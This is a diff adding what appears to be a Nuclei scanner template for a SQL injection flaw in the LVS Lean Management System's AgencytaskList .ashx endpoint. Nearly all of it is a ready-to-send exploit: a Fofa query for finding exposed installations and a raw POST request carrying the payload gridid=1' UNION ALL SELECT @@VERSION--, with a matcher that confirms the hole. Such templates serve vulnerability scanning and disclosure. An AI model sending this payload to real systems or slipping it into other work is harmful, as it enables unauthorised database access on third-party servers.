@@ -1,0 +1,35 @@
+id: Lean_Management_System_LVS_Web_ashx_SQL_injected
+
+info:
+  name: Lean_Management_System_LVS_Web_ashx_SQL_injected
+  author: HK
+  severity: high
+  description:  LVS精益管理系统/ajax/LVS.Web.AgencytaskList,LVS.Web.ashx接口存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Content-Type: text/plain; charset=UTF-8
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: keep-alive
+    Content-Length: 58
+
+    src=AgencytaskList
+    gridid=1' UNION ALL SELECT @@VERSION--
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - SQL
